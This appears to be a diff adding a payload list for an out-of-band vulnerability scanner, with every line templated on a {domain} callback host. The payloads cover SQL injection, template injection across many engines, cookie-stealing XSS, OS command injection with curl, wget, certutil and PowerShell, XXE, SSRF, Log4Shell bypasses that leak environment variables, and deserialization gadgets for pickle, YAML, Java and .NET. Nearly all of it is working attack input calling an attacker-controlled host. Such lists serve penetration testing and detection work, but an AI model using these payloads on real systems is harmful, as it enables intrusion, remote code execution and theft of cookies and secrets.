@@ -1,0 +1,243 @@
+##POLYGLOT - SQLi Cross-Dialect (OOB)##
+';EXEC master..xp_dirtree '\\{domain}\a'--/*'OR LOAD_FILE('\\\\{domain}\\a')OR'*/"OR(SELECT dblink_send_query('host={domain}','SELECT 1'))--
+1;COPY(SELECT '')TO PROGRAM 'nslookup {domain}'--/*'UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))--*/"--
+';DECLARE @q VARCHAR(1024);SET @q='\\'+@@version+'.{domain}\a';EXEC master..xp_dirtree @q--
+##POLYGLOT - SSTI Cross-Engine (OOB)##
+{{__import__('urllib.request').request.urlopen('http://{domain}/ssti')}}${T(java.net.URL).new('http://{domain}/ssti').openStream()}<%= require('net/http');Net::HTTP.get(URI('http://{domain}/ssti')) %>${{T(java.net.URL).new('http://{domain}/ssti').openStream()}}
+{% set x=__import__('urllib.request').request.urlopen('http://{domain}/ssti') %}#{require('net/http');Net::HTTP.get(URI('http://{domain}/ssti'))}${{T(java.net.URL).new('http://{domain}/ssti').openStream()}}
+##POLYGLOT - XSS Blind/OOB##
+'"><script src=//{domain}/x.js></script><img src=//{domain}/x onerror=alert(1337)><!--
+'"><img src=x onerror="fetch('//{domain}/'+document.cookie);alert(1337)"><svg/onload=fetch('//{domain}/')><!--
+--></script>'"><img src=x onerror="new Image().src='//{domain}/?c='+document.cookie;alert(1337)"><!--
+##POLYGLOT - OS Command Injection Cross-Shell (OOB)##
+;nslookup {domain} #'|nslookup {domain}|"$(nslookup {domain})`nslookup {domain}`
+&ping -c1 {domain}&;curl {domain};'|curl {domain} #"|wget {domain}|`nslookup {domain}`
+||nslookup {domain}||&certutil -urlcache -f http://{domain}/x x&;wget -q http://{domain};
+##POLYGLOT - Code Injection Cross-Language (OOB)##
+__import__('urllib.request').request.urlopen('http://{domain}/pyeval')
+require('http').get('http://{domain}/nodeeval')
+file_get_contents('http://{domain}/phpeval')
+require 'net/http';Net::HTTP.get(URI('http://{domain}/rbeval'))
+use IO::Socket::INET;IO::Socket::INET->new(PeerAddr=>'{domain}',PeerPort=>9999)
+new java.net.URL('http://{domain}/javaeval').openStream()
+##SQLi - OOB (Out-of-Band)##
+'AND LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+"AND LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+')AND LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+1 AND LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+'UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+'UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a')),NULL#
+'AND(SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.{domain}\\a')))#
+';SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+';EXEC master..xp_dirtree '\\{domain}\a'--
+";EXEC master..xp_dirtree '\\{domain}\a'--
+');EXEC master..xp_dirtree '\\{domain}\a'--
+1;EXEC master..xp_dirtree '\\{domain}\a'--
+';EXEC master..xp_dirtree '\\'+@@version+'.{domain}\a'--
+";EXEC master..xp_dirtree '\\'+@@version+'.{domain}\a'--
+';EXEC master..xp_fileexist '\\{domain}\a'--
+";EXEC master..xp_fileexist '\\{domain}\a'--
+1;DECLARE @q VARCHAR(1024);SET @q='\\'+@@version+'.{domain}\a';EXEC master..xp_dirtree @q--
+';COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'--
+";COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'--
+');COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'--
+1;COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'--
+';SELECT dblink_connect('host={domain} user=a password=a dbname=a')--
+";SELECT dblink_connect('host={domain} user=a password=a dbname=a')--
+';COPY (SELECT '') TO PROGRAM 'curl http://{domain}/'--
+';COPY (SELECT '') TO PROGRAM 'wget http://{domain}/'--
+'AND 1=UTL_HTTP.REQUEST('http://{domain}/'||version)--
+"AND 1=UTL_HTTP.REQUEST('http://{domain}/'||version)--
+')AND 1=UTL_HTTP.REQUEST('http://{domain}/'||version)--
+1 AND 1=UTL_HTTP.REQUEST('http://{domain}/')--
+'OR 1=UTL_INADDR.GET_HOST_ADDRESS('{domain}')--
+"OR 1=UTL_INADDR.GET_HOST_ADDRESS('{domain}')--
+'AND 1=HTTPURITYPE('http://{domain}/').GETCLOB()--
+"AND 1=HTTPURITYPE('http://{domain}/').GETCLOB()--
+'||(SELECT UTL_HTTP.REQUEST('http://{domain}/'||user) FROM dual)||'
+'||(SELECT HTTPURITYPE('http://{domain}/').GETCLOB() FROM dual)||'
+';SELECT UTL_HTTP.REQUEST('http://{domain}/') FROM dual--
+##SSTI - OOB##
+{{config.__class__.__init__.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://{domain}/ssti')}}
+{{lipsum.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://{domain}/ssti')}}
+{{cycler.__init__.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://{domain}/ssti')}}
+{{joiner.__init__.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://{domain}/ssti')}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://{domain}/ssti')}}
+{{request.application.__globals__.__builtins__.__import__('urllib.request').request.urlopen('http://{domain}/ssti')}}
+{{self._TemplateReference__context.cycler.__init__.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://{domain}/ssti')}}
+${__import__('urllib.request').request.urlopen('http://{domain}/ssti')}
+<%= require('net/http');Net::HTTP.get(URI('http://{domain}/ssti')) %>
+<%= require('open-uri');URI.open('http://{domain}/ssti').read %>
+{{['http://{domain}/ssti']|filter('file_get_contents')}}
+{{['http://{domain}/ssti']|map('file_get_contents')}}
+${T(java.net.URL).new('http://{domain}/ssti').openStream()}
+${"java.net.URL"?new("http://{domain}/ssti").openStream()}
+<#assign url="java.net.URL"?new("http://{domain}/ssti")>${url.openStream()}
+<% require('http').get('http://{domain}/ssti',function(r){}); %>
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('http').get('http://{domain}/ssti');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+##Tornado (Python) - OOB##
+{%import urllib.request%}{{urllib.request.urlopen('http://{domain}/tornado')}}
+{%import urllib.request%}{{urllib.request.urlopen('http://{domain}/tornado').read()}}
+##Smarty (PHP) - OOB##
+{fetch file="http://{domain}/smarty"}
+{fetch file="http://{domain}/smarty" assign="x"}
+##Blade (PHP/Laravel) - OOB##
+@php file_get_contents('http://{domain}/blade') @endphp
+@php fopen('http://{domain}/blade','r') @endphp
+##ERB (Ruby) - OOB##
+<%=require 'net/http';Net::HTTP.get(URI('http://{domain}/erb'))%>
+<%=require 'open-uri';URI.open('http://{domain}/erb').read%>
+##Slim (Ruby) - OOB##
+=require 'net/http';Net::HTTP.get(URI('http://{domain}/slim'))
+##Haml (Ruby) - OOB##
+=require 'net/http';Net::HTTP.get(URI('http://{domain}/haml'))
+##Thymeleaf (Java) - OOB##
+[[${T(java.net.URL).new('http://{domain}/thymeleaf').openStream()}]]
+[[${new java.util.Scanner(T(java.net.URL).new('http://{domain}/thymeleaf').openStream()).next()}]]
+##Pebble (Java) - OOB##
+{{"".getClass().forName("java.net.URL").getConstructor("".getClass()).newInstance("http://{domain}/pebble").openStream()}}
+##Razor (C#/.NET) - OOB##
+@{new System.Net.WebClient().DownloadString("http://{domain}/razor");}
+@{new System.Net.Http.HttpClient().GetStringAsync("http://{domain}/razor").Result;}
+##OS Cmd Injection - OOB##
+;curl http://{domain}
+|curl http://{domain}
+||curl http://{domain}
+&&curl http://{domain}
+;curl${IFS}http://{domain}
+;wget http://{domain}
+|wget http://{domain}
+;nslookup {domain}
+|nslookup {domain}
+||nslookup {domain}
+&&nslookup {domain}
+;ping -c 1 {domain}
+|ping -c 1 {domain}
+;dig {domain}
+;host {domain}
+;/bin/bash -c "true > /dev/tcp/{domain}/9999"
+;python3 -c "__import__('urllib.request').request.urlopen('http://{domain}')"
+;python -c "import urllib2;urllib2.urlopen('http://{domain}')"
+;curl http://{domain}#'|curl http://{domain}|"`curl http://{domain}`
+& nslookup {domain}
+| nslookup {domain}
+|| nslookup {domain}
+&& nslookup {domain}
+& certutil -urlcache -f http://{domain} out.tmp
+& powershell Invoke-WebRequest http://{domain}
+& powershell -c "iwr http://{domain}"
+| powershell -c "(New-Object Net.WebClient).DownloadString('http://{domain}')"
+& ping -n 1 {domain}
+| ping -n 1 {domain}
+;curl${IFS}http://{domain}#'&${IFS}nslookup${IFS}{domain}&"`curl${IFS}http://{domain}`
+;perl -e "use IO::Socket::INET;IO::Socket::INET->new(PeerAddr=>'{domain}',PeerPort=>9999)"
+;ruby -e "require 'net/http';Net::HTTP.get(URI('http://{domain}'))"
+;node -e "require('http').get('http://{domain}')"
+;python3 -c "__import__('socket').create_connection(('{domain}',9999))"
+;php -r "fsockopen('{domain}',9999);"
+##Code Injection - OOB (Built-in HTTP/stdlib)##
+__import__('socket').create_connection(('{domain}',9999))
+__import__('http.client').client.HTTPConnection('{domain}',9999).request('GET','/')
+require('net').connect(9999,'{domain}')
+fetch('http://{domain}/nodeeval')
+file_get_contents("http://{domain}/phpeval")
+fsockopen("{domain}",9999)
+fopen("http://{domain}/phpeval","r")
+stream_socket_client("tcp://{domain}:9999")
+require 'net/http'; Net::HTTP.get(URI('http://{domain}/rbeval'))
+TCPSocket.new('{domain}',9999)
+require('open-uri');URI.open('http://{domain}/rbeval')
+use IO::Socket::INET; IO::Socket::INET->new(PeerAddr=>'{domain}',PeerPort=>9999)
+use LWP::Simple; get("http://{domain}/pleval")
+new java.net.URL("http://{domain}/javaeval").openStream()
+new java.net.Socket("{domain}",9999)
+Invoke-WebRequest http://{domain}/pseval
+(New-Object Net.WebClient).DownloadString("http://{domain}/pseval")
+[System.Net.Sockets.TcpClient]::new('{domain}',9999)
+##XXE - OOB##
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{domain}/xxe.dtd">%xxe;]><root>1337</root>
+<hjk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://{domain}/xxe" parse="text"/></hjk>
+##SSRF - OOB##
+https://{domain}/ssrf
+http://{domain}:8080/ssrf
+http://{domain}:443/ssrf
+//{domain}/ssrf
+\\{domain}\ssrf
+http://{domain}%23@127.0.0.1
+http://foo.{domain}/ssrf
+gopher://{domain}:70/_test
+ftp://{domain}/ssrf
+dict://{domain}:11211/INFO
+ldap://{domain}:389/
+##Path Traversal - OOB##
+....//....//....//....//proc/self/environ
+/proc/self/net/arp
+##NoSQL - OOB##
+{"$where":"this.a==1||new Function('return fetch(\"http://{domain}/nosql\")')()"}
+[$where]=fetch('http://{domain}/nosql')
+##EL Injection - OOB##
+${T(java.net.URL).new('http://{domain}/eleval').openStream()}
+#{T(java.net.URL).new('http://{domain}/eleval').openStream()}
+${new java.net.URL("http://{domain}/eleval").openStream()}
+${new java.net.Socket("{domain}",9999)}
+%{(#url=new java.net.URL('http://{domain}/eleval')).(#url.openStream())}
+##CRLF - OOB##
+%0d%0aHost:1337.{domain}
+##Python Pickle P0 - OOB urllib##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUiKScKdFIu
+##Python Pickle P0 - OOB DNS##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygic29ja2V0IikuZ2V0YWRkcmluZm8oIntkb21haW59Iiw4MCknCnRSLg==
+##Python Pickle P2 - OOB urllib##
+gAJjX19idWlsdGluX18KZXZhbApxAFhHAAAAX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUyIilxAYVxAlJxAy4=
+##Python Pickle P4 - OOB urllib##
+gASVYwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxHX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGU0IimUhZRSlC4=
+##Python YAML - OOB urllib##
+!!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml')"]
+##Python YAML - OOB DNS##
+!!python/object/apply:builtins.eval ["__import__('socket').getaddrinfo('{domain}',80)"]
+##Python YAML - OOB exec urllib##
+!!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml2')"]
+##Python jsonpickle - OOB urllib##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["__import__('urllib.request').request.urlopen('http://{domain}/jsonpickle')"]}]}
+##Python jsonpickle - OOB DNS##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["__import__('socket').getaddrinfo('{domain}',80)"]}]}
+##Node node-serialize - OOB http.get##
+{"rce":"_$$ND_FUNC$$_function(){require('http').get('http://{domain}/nodeser')}()"}
+##Java JNDI - OOB iiop##
+${jndi:iiop://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 1##
+${${lower:j}ndi:${lower:l}dap://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 2##
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 3##
+${j${::-n}di:ldap://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 4##
+${jn${lower:d}i:ldap://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 5##
+${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{domain}/a}
+##Java JNDI - OOB env leak##
+${jndi:ldap://{domain}/${env:USER}}
+##Java JNDI - OOB java version leak##
+${jndi:ldap://{domain}/${java:version}}
+##Java JNDI - OOB sys property leak##
+${jndi:ldap://{domain}/${sys:user.dir}}
+##Java Fastjson - OOB (InetAddress DNS)##
+{"@type":"java.net.InetAddress","val":"{domain}"}
+##Java Fastjson - OOB (Inet4Address)##
+{"@type":"java.net.Inet4Address","val":"{domain}"}
+##SnakeYAML - Error (URLClassLoader OOB)##
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://{domain}/snakeyaml"]]]]
+##XMLDecoder - OOB URL.openStream##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.net.URL"><string>http://{domain}/xmldecoder</string><void method="openStream"/></object></java>
+##ysoserial URLDNS - OOB (DNS lookup)##
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHA/QAAAAAAADHcIAAAAEAAAAAFzcgAMamF2YS5uZXQuVVJMliU3Nhr85HIDAAdJAAhoYXNoQ29kZUkABHBvcnRMAAlhdXRob3JpdHl0ABJMamF2YS9sYW5nL1N0cmluZztMAARmaWxldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEaG9zdHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHByb3RvY29sdAASTGphdmEvbGFuZy9TdHJpbmc7TAADcmVmdAASTGphdmEvbGFuZy9TdHJpbmc7cP//////////dAAIe2RvbWFpbn10AAcvdXJsZG5zdAAIe2RvbWFpbn10AARodHRwcHh0ABZodHRwOi8ve2RvbWFpbn0vdXJsZG5zeA==
+##Java Hessian - OOB (JNDI ref)##
+C_hessianRldap://{domain}/a
+##.NET Json.NET - OOB (nslookup)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"nslookup","Arguments":"{domain}"}}}
+##.NET Json.NET - OOB (AssemblyInstaller UNC)##
+{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"\\\\{domain}\\share\\evil.dll"}
+##.NET XmlSerializer - OOB (nslookup)##
+<root type="System.Windows.Data.ObjectDataProvider, PresentationFramework"><ObjectInstance type="System.Diagnostics.Process, System"><StartInfo><FileName>nslookup</FileName><Arguments>{domain}</Arguments></StartInfo></ObjectInstance><MethodName>Start</MethodName></root>
+##.NET SoapFormatter - OOB (nslookup)##
+<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><a1:ObjectDataProvider xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Windows.Data/PresentationFramework"><MethodName>Start</MethodName><ObjectInstance xsi:type="a2:Process" xmlns:a2="http://schemas.microsoft.com/clr/nsassem/System.Diagnostics/System"><StartInfo><FileName>nslookup</FileName><Arguments>{domain}</Arguments></StartInfo></ObjectInstance></a1:ObjectDataProvider></SOAP-ENV:Body></SOAP-ENV:Envelope>
